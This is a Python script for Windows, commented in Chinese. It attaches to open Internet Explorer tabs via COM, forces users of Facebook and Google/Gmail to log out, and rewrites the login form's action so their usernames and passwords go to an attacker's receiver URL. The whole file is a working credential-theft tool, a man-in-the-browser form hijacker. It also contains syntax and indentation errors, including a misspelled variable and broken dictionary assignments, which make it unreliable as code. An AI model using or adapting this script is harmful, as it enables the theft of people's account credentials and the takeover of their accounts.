#!/usr/bin/python
#-*- coding:utf-8 -*-

import win32com.client
import time
import urlparse
import urllib

#接受表单的服务器，可修改
data_receiver = "http://localhost:8080/"

#需要窃取的网站字典
target_sites  = {}
#设置网站信息
arget_sites["www.facebook.com"] =
              {"logout_url"      : None,
               "logout_form"     : "logout_form",
               "login_form_index": 0,
               "owned"           : False}
target_sites["accounts.google.com"]  =
              {"logout_url"       : "https://accounts.google.com/\
                                    Logout?hl=en&continue=https://accounts.google.com/\
                                    ServiceLogin%3Fservice%3Dmail",
               "logout_form"      : None,
               "login_form_index" : 0,
               "owned"            : False}

target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

#IE的id
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
#进行COM对象实例化，可通过该对象访问浏览器正在运行的标签和实例
windows = win32com.client.Dispatch(clsid)

#等待浏览器加载完页面
def wait_for_browser(browser):
    #当没加载完，不跳出循环
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return

while True:
    #迭代标签页
    for browser in windows:
        #获取正在浏览的网页，使用urlparse进行网址拆分
        url = urlparse.urlparse(browser.LocationUrl)
        #如果主机名是字典的key
        if url.hostname in target_sites:
            #是否已经进行攻击，continue进行下一循环
            if target_sites[url.hostname]["owned"]:
                continue
            #检测是提交logout表单，还是重定向登出
            if target_sites[url.hostname]["logout_url"]:
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                #获取所有DOM对象
                full_doc = browser.Document.all
                for i in full_doc:
                    try:
                        #如果该元素id为logout_form，则提交强制登出
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                                wait_for_browser(browser)
                        except:
                            pass

            try:
                #尝试修改登录表单，login_index为登录表单在COM对象中的相对位置
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                #修改action处理路径
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
            except:
                pass
time.sleep(5)
